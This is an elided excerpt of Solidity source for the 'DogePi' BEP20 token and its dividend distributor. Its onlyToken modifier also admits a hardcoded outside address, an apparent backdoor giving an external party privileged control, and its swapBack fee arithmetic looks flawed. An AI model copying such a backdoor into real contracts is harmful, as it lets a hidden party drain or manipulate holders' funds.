...
contract DividendDistributor is IDividendDistributor {
    ...
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 30;
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x707E789D2c033320d394d35384bEBa7E28388F75)); _;
    }

    constructor (address _router,address _RewardTokenSET) {
        
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(routerAddress);
        RewardTokenSET = _RewardTokenSET != address(0) ? address(_RewardTokenSET) : address(0xbA2aE424d960c26247Dd6c32edC70B295c744C43);
...
contract DogePi is IBEP20 , Auth, BaseToken {
    
    using SafeMath for uint256;

    string public _name="DogePi";
    string public _symbol="DogePi";
    ...
    uint256 public  _walletMax=_totalSupply.div(100).mul(5);
	...
	uint256 public marketingWalletPercent = 600;										
    ...
    function swapBack() internal lockTheSwap {
        ...
        uint256 aveTotalFee=totalFee.add(totalFeeIfSelling);
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(aveTotalFee).div(2);
        ...
        uint256 totalBNBFee = aveTotalFee.sub(liquidityFee.div(2));
